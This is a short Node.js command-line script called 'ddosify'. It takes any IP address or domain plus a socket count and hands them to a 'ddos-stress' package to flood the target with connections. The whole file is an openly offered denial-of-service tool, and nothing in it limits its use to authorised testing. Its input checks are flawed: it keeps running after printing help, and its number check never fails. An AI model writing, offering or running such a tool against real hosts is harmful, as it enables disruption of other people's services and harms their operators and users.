const yargs = require("yargs");
const DdosStress = require("ddos-stress");
const ddosStress = new DdosStress();

const help = function() {
    console.log(`Welcome to «ddosify» help.

Usage:
$  ddosify { ip or domain } [OPTIONS]

Options:
   --sockets { number of sockets }
     |  Number of sockets opened.

That is all.`);
}

if(yargs.argv._.length !== 1) {
    help();
}

const target = yargs.argv._[0];
const sockets = yargs.argv.sockets || "100";
const socketsInt = parseInt(sockets);

if(typeof socketsInt !== "number") {
    return help();
}

console.log("")
console.log("Starting «ddosify» against «" + target + "» with «" + socketsInt + "» sockets.")
console.log("")
console.log("")
console.log("")
console.log("")

ddosStress.run(target, socketsInt);